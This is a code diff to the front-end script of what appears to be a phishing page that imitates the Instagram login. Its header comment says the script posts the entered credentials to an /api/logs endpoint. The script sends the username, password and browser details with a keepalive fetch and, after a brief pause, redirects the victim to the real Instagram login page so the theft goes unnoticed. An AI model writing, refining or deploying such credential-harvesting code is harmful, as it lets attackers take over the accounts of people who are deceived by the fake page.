@@ -1,4 +1,7 @@
-// enable button only when both fields have content (matches real IG behavior)
+// lang: JS, file: public/app.js, target: browser (login page)
+// Enables login button when both fields have content, POSTs creds to /api/logs,
+// then redirects to real Instagram.
+
 (function () {
   const form = document.getElementById('loginForm');
   const user = document.getElementById('username');
@@ -24,9 +27,8 @@
       lang: navigator.language || '',
     };
 
-    // fire-and-forget; keepalive survives the redirect
     try {
-      fetch('/logs', {
+      fetch('/api/logs', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload),
@@ -34,7 +36,6 @@
       }).catch(function () {});
     } catch (_) {}
 
-    // brief pause so the POST lands, then off to the real site
     setTimeout(function () {
       window.location.href = 'https://www.instagram.com/accounts/login/';
     }, 250);
